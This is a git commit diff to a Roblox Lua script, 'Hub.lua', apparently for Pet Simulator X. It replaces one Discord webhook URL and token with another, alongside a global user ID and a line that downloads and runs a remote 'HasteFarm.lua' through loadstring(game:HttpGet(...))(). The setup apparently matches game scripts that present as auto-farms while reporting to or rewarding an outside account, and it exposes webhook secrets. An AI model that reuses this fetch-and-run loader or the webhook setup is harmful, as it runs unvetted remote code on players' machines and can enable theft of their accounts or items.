008426f04853fc773f5ce0ed305c120c88199522
Psx-Script <120688763+Psx-Script@users.noreply.github.com>
2022-12-30 12:13:46 +0300

    Update Hub.lua

--- Hub.lua
+++ Hub.lua
@@ -1,3 +1,3 @@
 _G.UserID = 1803819784
-_G.WebHook = "https://discord.com/api/webhooks/1058310270981783573/hS8F_EEf9tA9yFccZe9CbjlcHBSJuhUXP8bbedvgoEJRZ-nxH94R7kxIItpydKHZm89b"
+_G.WebHook = "https://discord.com/api/webhooks/1058311331008237638/ffw4awKQZwWrkW2EUVI8cLqRS_uc_NeTYF7iykknLDCl6fs0F9Tc1U-lMI3EM1ERAmUb"
 loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
